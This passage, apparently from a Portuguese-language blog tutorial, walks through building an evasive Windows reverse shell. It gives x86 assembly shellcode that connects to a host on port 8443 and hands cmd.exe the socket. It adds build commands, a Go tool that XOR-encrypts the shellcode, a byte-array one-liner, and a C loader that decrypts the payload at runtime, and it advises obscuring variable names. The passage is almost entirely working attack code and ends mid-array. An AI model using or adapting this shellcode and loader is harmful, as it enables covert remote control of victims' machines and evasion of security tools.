	<span class="nf">push</span> <span class="nb">esp</span>                   <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                   <span class="c1">;movendo ponteiro da ws2_32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                   <span class="c1">;chamando GetProcAddress("ws2_32.dll", "connect")</span>

<span class="nl">ConnectCall:</span>

	 <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x8148A9C1</span>    <span class="c1">;movendo 192.168.71.128 + 0x01010101 para a stack</span>
	 <span class="nf">sub</span> <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x01010101</span>    <span class="c1">;subtraindo 0x01010101</span>
	 <span class="nf">push</span> <span class="nb">edx</span>               <span class="c1">;movendo ponteiro da sin_addr para a stack</span>
	 <span class="nf">push</span> <span class="kt">word</span> <span class="mh">0xFB20</span>       <span class="c1">;movendo porta 8443 = 0x20FB para a stack</span>
	 <span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>
	 <span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mi">2</span>
	 <span class="nf">push</span> <span class="nb">dx</span>
	 <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
	 <span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x10</span>
	 <span class="nf">push</span> <span class="nb">edx</span>
	 <span class="nf">push</span> <span class="nb">edi</span>
	 <span class="nf">call</span> <span class="nb">eax</span>               <span class="c1">;chamando connect</span>

<span class="nl">CreateProcessA:</span>

	<span class="nf">push</span> <span class="mh">0x4e4e4173</span>              <span class="c1">;movendo NNAs para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x2</span><span class="p">],</span> <span class="mh">0x4e4e</span> <span class="c1">;removendo o "NN"</span>
	<span class="nf">push</span> <span class="mh">0x7365636f</span>              <span class="c1">;movendo seco para stack</span>
	<span class="nf">push</span> <span class="mh">0x72506574</span>              <span class="c1">;movendo rPet para stack</span>
	<span class="nf">push</span> <span class="mh">0x61657243</span>              <span class="c1">;movendo aerC para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                     <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">ebx</span>                     <span class="c1">;movendo ponteiro da kernel32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                     <span class="c1">;chamando GetProcAddress("kernel32.dll", "CreateProcessA")</span>
	<span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">ebx</span>                 <span class="c1">;salvando kernel32 em um novo ponteiro</span>

<span class="nl">cmd:</span>

	<span class="nf">push</span> <span class="mh">0x4e646d63</span>            <span class="c1">;movendo Ndmc para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span> <span class="c1">;removendo o "N"</span>
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>               <span class="c1">;movendo ponteiro da string para a stack</span>
        <span class="c1">;configurando a estrutura STARTUPINFO</span>
	<span class="nf">push</span> <span class="nb">edi</span>                   <span class="c1">;preenchendo o argumento hStdError com o socket</span>
	<span class="nf">push</span> <span class="nb">edi</span>                   <span class="c1">;preenchendo o argumento hStdOutput com o socket</span>
	<span class="nf">push</span> <span class="nb">edi</span>                   <span class="c1">;preenchendo o argumento hStdInput com o socket</span>
	<span class="nf">xor</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">edi</span>               <span class="c1">;limpando edi par usar com os NULLs que precisamos</span>
	<span class="nf">push</span> <span class="kt">byte</span> <span class="mh">0x12</span>             <span class="c1">;enviaremos 18 * 4 = 72 null bytes para stack (tamanho da estrutura da STARTUPINFOA)</span>
	<span class="nf">pop</span> <span class="nb">ecx</span>                    <span class="c1">;preparando ecx para o loop</span>

<span class="nl">looper:</span>

	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;enviando uma dword null para stack</span>
	<span class="nf">loop</span> <span class="nv">looper</span>                      <span class="c1">;fazendo o loop até enviar para stack os nulls suficientes</span>
	<span class="nf">mov</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3c</span><span class="p">],</span> <span class="mh">0x0101</span>    <span class="c1">;configurando dwFlags para STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW</span>
	<span class="nf">mov</span> <span class="kt">byte</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">],</span> <span class="mh">0x44</span>      <span class="c1">;configurando cb com o tamanho da estrutura 0x44 = 68 decimal</span>
	<span class="nf">lea</span> <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>            <span class="c1">;configurando ecx como um ponteiro para a estrutura STARTUPINFO</span>
	<span class="c1">;montando e chamando CreateProcessA</span>
	<span class="nf">push</span> <span class="nb">esp</span>                         <span class="c1">;enviando ponteiro da PROCESS_INFORMATION para stack</span>
	<span class="nf">push</span> <span class="nb">ecx</span>                         <span class="c1">;enviando ponteiro da STARTUPINFOA para stack</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpCurrentDirectory será NULL então o processo inicializará no mesmo diretório do processo pai</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpEnvironment será NULL então o processo terá o mesmo ambiente do processo pai</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento dwCreationFlags será NULL</span>
	<span class="nf">inc</span> <span class="nb">edi</span>                          <span class="c1">;edi==1</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento bInheritHandles=TURE</span>
	<span class="nf">dec</span> <span class="nb">edi</span>                          <span class="c1">;edi==0</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpThreadAttributes será NULL</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpProcessAttributes será NULL</span>
	<span class="nf">push</span> <span class="nb">ebx</span>                         <span class="c1">;argumento lpCommandLine apontará para "cmd,0"</span>
	<span class="nf">push</span> <span class="nb">edi</span>                         <span class="c1">;argumento lpApplicationName será NULL</span>
	<span class="nf">call</span> <span class="nb">eax</span>                         <span class="c1">;chamando CreateProcessA</span>

<span class="nl">ExitProcess:</span>

	<span class="nf">push</span> <span class="mh">0x4e737365</span>            <span class="c1">;movendo Nsse para stack</span>
	<span class="nf">sub</span> <span class="kt">word</span> <span class="p">[</span><span class="nb">esp</span> <span class="o">+</span> <span class="mh">0x3</span><span class="p">],</span> <span class="mh">0x4e</span> <span class="c1">;removendo o "N"</span>
	<span class="nf">push</span> <span class="mh">0x636f7250</span>            <span class="c1">;movendo corP para stack</span>
	<span class="nf">push</span> <span class="mh">0x74697845</span>            <span class="c1">;movendo tixE para stack</span>
	<span class="nf">push</span> <span class="nb">esp</span>                   <span class="c1">;movendo ponteiro da string para a stack</span>
	<span class="nf">push</span> <span class="nb">esi</span>                   <span class="c1">;movendo ponteiro da kernel32 para esi</span>
	<span class="nf">call</span> <span class="nb">ebp</span>                   <span class="c1">;chamando GetProcAddress("kernel32.dll", "ExitProcess")</span>

	<span class="c1">;chamando ExitProcess</span>
	<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>               <span class="c1">;zerando registrador</span>
	<span class="nf">push</span> <span class="nb">ecx</span>                   <span class="c1">;enviando 0x00 para stack</span>
	<span class="nf">call</span> <span class="nb">eax</span>                   <span class="c1">;chamando ExitProcess</span>
</pre></table></code></div></div><p>Em seguida o compilamos para ter um executável <code class="language-plaintext highlighter-rouge">ELF</code> chamado <code class="language-plaintext highlighter-rouge">shell</code>:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nasm <span class="nt">-f</span> elf shell.asm
<span class="nv">$ </span>ld <span class="nt">-m</span> elf_i386 <span class="nt">-o</span> shell shell.o
</pre></table></code></div></div><p>Com o binário <code class="language-plaintext highlighter-rouge">shell</code>, precisamos de alguns passos para aplicar a XOR <em>encryption</em>, o primeiro passo é convertê-lo em um <em>raw binary</em>, ou seja, um arquivo que contenha os <em>bytes</em> puros do <em>shellcode</em>, podemos utilizar o <code class="language-plaintext highlighter-rouge">objcopy</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>objcopy <span class="nt">-O</span> binary shell shell.bin
</pre></table></code></div></div><p>Com o arquivo <code class="language-plaintext highlighter-rouge">shell.bin</code> sendo um <code class="language-plaintext highlighter-rouge">raw binary</code>, criei um programa em Go que lê o conteúdo do arquivo e, para cada <em>byte</em>, aplica a XOR <em>encryption</em> com uma chave especificada, neste exemplo a chave será <code class="language-plaintext highlighter-rouge">7h3L0s7C4rc0s4</code>.</p><div lang="go" class="language-go highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
        <span class="s">"fmt"</span>
        <span class="s">"io"</span>
        <span class="s">"os"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">xorEncryptDecrypt</span><span class="p">(</span><span class="n">data</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">,</span> <span class="n">key</span> <span class="kt">string</span><span class="p">)</span> <span class="p">[]</span><span class="kt">byte</span> <span class="p">{</span>
        <span class="n">keyLen</span> <span class="o">:=</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="n">keyBytes</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
        <span class="n">encrypted</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

        <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
                <span class="n">encrypted</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">keyBytes</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">keyLen</span><span class="p">]</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="n">encrypted</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">processFile</span><span class="p">(</span><span class="n">inputFile</span><span class="p">,</span> <span class="n">outputFile</span><span class="p">,</span> <span class="n">key</span> <span class="kt">string</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
        <span class="n">inFile</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Open</span><span class="p">(</span><span class="n">inputFile</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"failed to open input file: %w"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="k">defer</span> <span class="n">inFile</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>

        <span class="n">outFile</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Create</span><span class="p">(</span><span class="n">outputFile</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"failed to create output file: %w"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
        <span class="p">}</span>
        <span class="k">defer</span> <span class="n">outFile</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>

        <span class="n">buffer</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="m">4096</span><span class="p">)</span> <span class="c">// Buffer size for reading the file</span>
        <span class="k">for</span> <span class="p">{</span>
                <span class="n">n</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">inFile</span><span class="o">.</span><span class="n">Read</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="o">&amp;&amp;</span> <span class="n">err</span> <span class="o">!=</span> <span class="n">io</span><span class="o">.</span><span class="n">EOF</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"failed to read from input file: %w"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
                <span class="p">}</span>
                <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="m">0</span> <span class="p">{</span>
                        <span class="k">break</span>
                <span class="p">}</span>

                <span class="n">encrypted</span> <span class="o">:=</span> <span class="n">xorEncryptDecrypt</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="o">:</span><span class="n">n</span><span class="p">],</span> <span class="n">key</span><span class="p">)</span>

                <span class="n">_</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">outFile</span><span class="o">.</span><span class="n">Write</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                        <span class="k">return</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Errorf</span><span class="p">(</span><span class="s">"failed to write to output file: %w"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
                <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="no">nil</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">)</span> <span class="o">!=</span> <span class="m">4</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Usage: %s &lt;input file&gt; &lt;output file&gt; &lt;key&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">0</span><span class="p">])</span>
                <span class="k">return</span>
        <span class="p">}</span>

        <span class="n">inputFile</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">1</span><span class="p">]</span>
        <span class="n">outputFile</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">2</span><span class="p">]</span>
        <span class="n">key</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">3</span><span class="p">]</span>

        <span class="n">err</span> <span class="o">:=</span> <span class="n">processFile</span><span class="p">(</span><span class="n">inputFile</span><span class="p">,</span> <span class="n">outputFile</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
                <span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Error: %v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
        <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Ao executarmos e compararmos o <code class="language-plaintext highlighter-rouge">shell.bin</code> com o arquivo de saída, podemos ver que temos dois arquivos do mesmo tamanho, porém compostos de <em>bytes</em> totalmente diferentes.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724094953.png" alt="" /></p><p>A partir desta saída, podemos criar o <em>shellcode</em> criptografado que será armazenado no programa, mas faremos uma alteração. No programa atual, declaramos a variável <code class="language-plaintext highlighter-rouge">unsigned char shellcode[]</code> que é um <em>array</em>, porém inserimos o <em>shellcode</em> como uma única <em>string</em>. Desta vez, criaremos de fato um <em>array</em> de <em>bytes</em>.</p><p>Para isso, um novo <em>oneliner</em> pode ser usado:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>shellXored.bin | xxd <span class="nt">-ps</span> <span class="nt">-c</span> 1<span class="si">)</span><span class="p">;</span><span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"0x</span><span class="nv">$i</span><span class="s2">, "</span><span class="p">;</span><span class="k">done</span><span class="p">;</span><span class="nb">echo</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240724100111.png" alt="" /></p><p>Este <em>array</em> substitui a <em>string</em> utilizada anteriormente como <em>shellcode</em> no programa.</p><p>Outra coisa a se fazer, é implementar uma função no programa que irá ler este <em>array</em> e para cada valor, aplicar o XOR com a chave para obtermos o <em>shellcode</em> original.</p><p>Primeiramente declaramos uma variável com a <em>key</em> (ignorem o fato do nome da variável, isso é um exemplo, utilize nomes não intuitivos).</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kt">char</span> <span class="n">xor_key</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"7h3L0s7C4rc0s4"</span><span class="p">;</span>
</pre></table></code></div></div><p>Em seguida, criamos a função <code class="language-plaintext highlighter-rouge">XOR</code> que fará o XOR <em>encryption</em>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">XOR</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">data_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
    <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">data_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="n">key_len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">a</span><span class="p">];</span>
        <span class="n">a</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Por último, invocamos a função antes de copiar o <em>shellcode</em> para o <em>buffer</em>.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">XOR</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">xor_key</span><span class="p">));</span>
</pre></table></code></div></div><p>O código completo fica:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x06</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xeb</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0b</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span 